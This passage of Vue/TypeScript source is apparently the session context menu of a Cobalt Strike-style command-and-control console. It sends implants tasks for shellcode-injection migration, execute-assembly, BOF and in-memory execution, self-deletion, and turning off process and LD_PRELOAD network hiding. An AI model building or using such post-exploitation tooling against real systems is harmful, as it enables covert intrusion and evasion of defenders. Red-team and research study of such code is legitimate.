    workspace.setSessionColor(c.Uid, color)
    c.Color = color
    ClientAPI.setClientColor(c.Uid, color).catch(() => {})
  }
  ElMessage.success(isZh.value ? '已更新会话高亮标记颜色' : 'Session color updated')
}

// 设置单个/批量会话分组（单个走 /client/update-group，批量走 /client/batch-update-group）
function setGroup() {
  close()
  const targets = getTargetClients()
  if (!targets.length) return
  const first = targets[0]
  ElMessageBox.prompt(
    isZh.value ? `为 ${targets.length} 个会话设置分组（留空清除）：` : `Set group for ${targets.length} session(s) (empty clears):`,
    t('ctx.session.group'),
    {
      confirmButtonText: isZh.value ? '设置' : 'Set',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
      inputValue: first.Group || '',
    },
  ).then(async ({ value }) => {
    const group = value || ''
    try {
      if (targets.length === 1) {
        await ClientAPI.update_client_group({ uid: first.Uid, group })
      } else {
        await ClientAPI.batch_update_client_group({ uids: targets.map((c) => c.Uid), group })
      }
      targets.forEach((c) => {
        c.Group = group
        clientsStore.updateClient(c.Uid, { Group: group })
      })
      ElMessage.success(isZh.value ? `已为 ${targets.length} 个会话设置分组` : `Group set for ${targets.length} session(s)`)
      clientsStore.refreshClients()
    } catch (e: any) {
      ElMessage.error(e?.message || (isZh.value ? '设置分组失败' : 'Failed to set group'))
    }
  }).catch(() => {})
}

// 智能存活检测（后端 /client/smart-offline-check，基于休眠时间与心跳判断）
// 智能存活检测（后端 /client/smart-offline-check，基于休眠时间与心跳判断）
async function smartAliveCheck() {
  close()
  const targets = getTargetClients()
  if (!targets.length) return
  const lines: string[] = []
  for (const c of targets) {
    try {
      const res = await ClientAPI.smart_offline_check({ uid: c.Uid })
      const body = res.data
      const label = `${c.Username || 'user'}@${c.Computer || c.ExternalIP}`
      const st = String(body?.status || 'unknown')
      const statusTextMap: Record<string, string> = {
        online: isZh.value ? '在线' : 'Online',
        possibly_busy: isZh.value ? '可能忙碌' : 'Possibly Busy',
        likely_offline: isZh.value ? '疑似离线' : 'Likely Offline',
        offline: isZh.value ? '已离线' : 'Offline',
      }
      const statusText = statusTextMap[st] || st
      lines.push(`${label}: ${statusText}\n${body?.message || ''}`)
      if (st === 'offline' || st === 'likely_offline') {
        clientsStore.updateClient(c.Uid, { Online: '2' })
      }
    } catch (e: any) {
      lines.push(`${c.Uid.slice(0, 8)}: ${e?.message || (isZh.value ? '检测失败' : 'Check failed')}`)
    }
  }
  await clientsStore.refreshClients().catch(() => {})
  ElMessageBox.alert(lines.join('\n\n'), t('ctx.session.check_alive'), {
    confirmButtonText: 'OK',
  }).catch(() => {})
}

// 注入迁移：生成无阶段 shellcode 上传并注入指定进程，新会话以目标进程身份上线
function openMigrate() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  workspace.openDialog('migrate', { uid: c.Uid })
}

function disconnectSession() {
  close()
  const targets = getTargetClients()
  if (!targets.length) return
  ElMessageBox.confirm(
    isZh.value ? `确定断开 ${targets.length} 个会话的客户端进程吗？会话记录将保留在列表中（与「删除会话」删除记录、「退出」删除记录不同）。` : `Kill client process on ${targets.length} session(s)? The session records will be kept in the list (unlike Remove which deletes records).`,
    t('ctx.session.disconnect'),
    {
      type: 'warning',
      confirmButtonText: isZh.value ? '断开' : 'Disconnect',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
    },
  ).then(async () => {
    for (const c of targets) {
      await ClientAPI.disconnect_client({ uid: c.Uid })
    }
    clientsStore.fetchClients()
    ElMessage.success(isZh.value ? '已发送断开指令，会话记录保留' : 'Disconnect sent; session records kept')
  }).catch(() => {})
}

function removeSession() {
  close()
  const targets = getTargetClients()
  if (!targets.length) return
  const online = targets.filter((c) => c.Online === '1')
  if (!online.length) {
    ElMessage.warning(isZh.value ? '没有在线的会话' : 'No online sessions')
    return
  }
  ElMessageBox.confirm(
    isZh.value ? `确定仅删除 ${online.length} 个在线客户端被控端进程文件吗？客户端保持在线（Linux unlink 运行中文件安全；Windows 重命名解锁）。` : `Delete process file on ${online.length} online session(s)? The beacon stays online (Linux unlink is safe; Windows renames to unlock).`,
    t('ctx.session.remove'),
    {
      type: 'warning',
      confirmButtonText: isZh.value ? '删除文件' : 'Delete File',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
    },
  ).then(async () => {
    await ClientAPI.batch_command({ uids: online.map((c) => c.Uid), command: 'selfdelete' })
    ElMessage.success(isZh.value ? '已下发删除进程文件指令（客户端保持在线）' : 'Delete process file tasked (beacon stays online)')
  }).catch(() => {})
}

function exitSession() {
  close()
  const targets = getTargetClients()
  if (!targets.length) return
  const online = targets.filter((c) => c.Online === '1')
  if (!online.length) {
    ElMessage.warning(isZh.value ? '没有在线的会话' : 'No online sessions')
    return
  }
  ElMessageBox.confirm(
    isZh.value ? `警告: 确定删除 ${online.length} 个客户端被控端进程文件并退出进程吗？会话记录保留（显示离线）。` : `WARNING: Delete process file and exit ${online.length} client process(es)? Session records are kept (shown offline).`,
    t('ctx.session.exit'),
    {
      type: 'error',
      confirmButtonText: isZh.value ? '删除并退出' : 'Delete & Exit',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
    },
  ).then(async () => {
    await ClientAPI.batch_command({ uids: online.map((c) => c.Uid), command: 'selfdelete_exit' })
    ElMessage.success(isZh.value ? '已下发删除文件并退出指令' : 'Delete & exit tasked')
  }).catch(() => {})
}

// 清理离线客户端：仅删除已离线会话的记录（在线客户端不受影响）
function cleanupOfflineSessions() {
  close()
  const targets = getTargetClients()
  if (!targets.length) return
  const offline = targets.filter((c) => c.Online !== '1')
  if (!offline.length) {
    ElMessage.info(isZh.value ? '所选会话全部在线，无需清理' : 'All selected sessions are online')
    return
  }
  ElMessageBox.confirm(
    isZh.value ? `确定删除 ${offline.length} 个离线客户端的会话记录吗？` : `Remove session records of ${offline.length} offline client(s)?`,
    t('ctx.session.cleanup_offline'),
    {
      type: 'warning',
      confirmButtonText: isZh.value ? '清理' : 'Clean Up',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
    },
  ).then(async () => {
    await ClientAPI.batch_delete_clients({ uids: offline.map((c) => c.Uid) })
    clientsStore.fetchClients()
    ElMessage.success(isZh.value ? `已清理 ${offline.length} 个离线会话记录` : `${offline.length} offline session(s) cleaned up`)
  }).catch(() => {})
}

// 恢复进程名: hideprocess off（还原首次隐藏前的原始进程名）
function restoreHideProcess() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ElMessageBox.confirm(
    isZh.value ? '确定恢复该客户端的原始进程名显示吗？' : 'Restore the original process name on this session?',
    t('ctx.persistence.unhide_proc'),
    { type: 'info', confirmButtonText: isZh.value ? '恢复' : 'Restore', cancelButtonText: isZh.value ? '取消' : 'Cancel' },
  ).then(async () => {
    await ClientAPI.sendCmd(c.Uid, 'hideprocess off')
    openConsoleForResults(c)
  }).catch(() => {})
}

// 恢复网络连接可见性: hidenet off（移除 LD_PRELOAD 过滤）
function restoreHideNet() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ElMessageBox.confirm(
    isZh.value ? '确定恢复该客户端的网络连接可见性吗？（移除 /etc/ld.so.preload 过滤库）' : 'Restore network visibility on this session? (Removes /etc/ld.so.preload filter lib)',
    t('ctx.persistence.unhide_net'),
    { type: 'info', confirmButtonText: isZh.value ? '恢复' : 'Restore', cancelButtonText: isZh.value ? '取消' : 'Cancel' },
  ).then(async () => {
    await ClientAPI.sendCmd(c.Uid, 'hidenet off')
    openConsoleForResults(c)
  }).catch(() => {})
}

// PostExpKit Handlers
function openBinExecute(mode: string) {
  close()
  const c = getPrimaryClient()
  if (!c) return
  workspace.openDialog('binExecute', { uid: c.Uid, mode })
}
function execAssembly() {
  openBinExecute('execute-assembly')
}
function execInline() {
  openBinExecute('inline-bin')
}
function execShellcode() {
  openBinExecute('shellcode-inject')
}
function execBof() {
  openBinExecute('bof')
}
function execLinuxScript() {
  openBinExecute('script')
}
function execLinuxBinary() {
  openBinExecute('binary')
}
function openPlugins() {
  close()
  workspace.openTab({ id: 'plugins', title: isZh.value ? '内存执行' : 'Memory Execution', component: 'plugins' })
}

function onGlobalClick(e: MouseEvent) {
  if (props.visible && menuRef.value && !menuRef.value.contains(e.target as Node)) {
    close()
  }
}

onMounted(() => {
  window.addEventListener('mousedown', onGlobalClick)
})

onBeforeUnmount(() => {
  window.removeEventListener('mousedown', onGlobalClick)
})
</script>

<style scoped>
.cs-beacon-ctx-menu {
  position: fixed;
  z-index: 9999;
  min-width: 190px;
  background: var(--cs-panel);
  border: 1px solid var(--cs-border);
  box-shadow: 2px 4px 12px rgba(0, 0, 0, 0.45);
  padding: 4px 0;
  user-select: none;
  font-size: 16.5px;
}

.ctx-item {
  position: relative;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 5px 14px;
  height: 30px;
  color: var(--cs-text);
  cursor: pointer;
  white-space: nowrap;
}
.ctx-item:hover {
  background: var(--cs-hover);
  color: var(--cs-text-bright);
}
.ctx-item.is-highlight {
  font-weight: 600;
}
.ctx-item.ctx-danger:hover {
  background: color-mix(in srgb, var(--cs-error) 20%, transparent);
  color: var(--cs-error);
}

.ctx-text {
  font-size: 16.5px;
}
.ctx-arrow {
  font-size: 12px;
  color: var(--cs-text-dim);
  margin-left: 14px;
}

.ctx-divider {
  height: 1px;
  background: var(--cs-border);
  margin: 4px 0;
}

.ctx-sub-menu {
  position: absolute;
  left: 100%;
  top: 0;
  min-width: 210px;
  background: var(--cs-panel);
  border: 1px solid var(--cs-border);
  box-shadow: 2px 4px 12px rgba(0, 0, 0, 0.45);
  padding: 4px 0;
  z-index: 10000;
}
.ctx-sub-menu::before {
  content: '';
  position: absolute;
  top: -8px;
  bottom: -8px;
  left: -20px;
  width: 20px;
  pointer-events: auto;
}

/* 1:1 CS Color Palette (Screenshot 6) */
.ctx-color-palette {
  position: absolute;
  left: 100%;
  top: 0;
  display: flex;
  align-items: center;
  gap: 6px;
  background: var(--cs-panel);
  border: 1px solid var(--cs-border);
  box-shadow: 2px 4px 12px rgba(0, 0, 0, 0.45);
  padding: 6px 8px;
  z-index: 10000;
}
.color-box {
  width: 24px;
  height: 24px;
  border: 1px solid var(--cs-border);
  border-radius: 1px;
  cursor: pointer;
  transition: transform 80ms ease;
}
.color-box:hover {
  transform: scale(1.15);
  border-color: var(--cs-active);
  box-shadow: 0 0 4px rgba(0, 0, 0, 0.3);
}
</style>
